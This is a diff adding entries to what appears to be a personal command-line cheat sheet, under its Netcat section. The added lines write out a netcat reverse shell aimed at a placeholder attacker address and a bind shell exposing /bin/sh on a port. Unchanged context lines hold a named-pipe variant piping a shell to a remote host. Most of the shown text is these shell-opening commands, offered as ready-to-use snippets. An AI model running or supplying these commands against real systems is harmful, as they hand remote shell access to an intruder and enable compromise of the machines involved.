@@ -30,10 +30,21 @@ sudo pmset sleep 15
 ```
 
 # Netcat
+- Reverse shell
+```
+On attacking machine: nc -lp PORT
+On target machine: nc -e /bin/sh IP.OF.ATTACKER PORT
+```
+
 - When -e flag does not exist:
 ```
 mknod /tmp/datapipe p
 /bin/bash 0</tmp/datapipe | nc remote.host.com port 1>/tmp/datapipe
+```
+
+- Bind a shell to a port:
+```
+nc -lp PORT -e /bin/sh
 ```
 
 # grep
